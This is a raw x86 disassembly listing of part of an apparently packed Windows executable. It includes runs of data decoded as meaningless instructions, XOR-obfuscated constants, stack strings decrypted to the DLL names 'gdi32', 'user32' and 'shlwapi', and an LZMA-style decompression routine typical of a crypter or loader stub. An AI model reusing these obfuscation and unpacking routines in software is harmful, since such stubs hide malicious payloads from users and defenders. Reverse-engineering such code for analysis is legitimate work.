  41f81c:	jb     0x41f7f9
  41f81e:	mov    esi,0xc5c25c28
  41f823:	cmp    DWORD PTR ds:0xe1c023ff,ecx
  41f829:	in     al,dx
  41f82a:	imul   DWORD PTR [ecx-0x26]
  41f82d:	add    al,0xe4
  41f82f:	int    0x7f
  41f831:	arpl   WORD PTR [ebx-0x1caaa559],si
  41f837:	shl    ah,1
  41f839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f83a:	pop    ecx
  41f83b:	faddp  st(6),st
  41f83d:	pop    ds
  41f83e:	sbb    al,0x45
  41f840:	and    eax,0xa9c8ac5f
  41f845:	add    al,0x2
  41f847:	imul   esi,edi,0x2d705fde
  41f84d:	push   eax
  41f84f:	lods   eax,DWORD PTR ds:[esi]
  41f850:	xchg   esi,eax
  41f851:	arpl   di,di
  41f853:	(bad)  
  41f854:	jno    0x41f809
  41f856:	mov    dl,0x67
  41f858:	fnsave [edi-0x158a4ea6]
  41f85e:	jmp    0x41f8b8
  41f860:	les    edi,FWORD PTR [eax+0x5d]
  41f863:	iret   
  41f864:	test   BYTE PTR [eax+0x2fc030bb],cl
  41f86a:	sub    al,0x5c
  41f86c:	push   es
  41f86d:	xchg   ecx,eax
  41f86e:	mov    dl,0x6
  41f870:	xchg   ebp,eax
  41f871:	push   eax
  41f872:	xor    DWORD PTR [esi],esi
  41f874:	dec    edx
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d55
  41f8e9:	mov    edx,DWORD PTR ds:0x42af4d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	icebp  
  41faa5:	or     DWORD PTR ds:0xf54d44d9,edi
  41faab:	dec    ecx
  41faac:	mov    edx,0xca40a531
  41fab1:	xor    eax,0x1025d
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
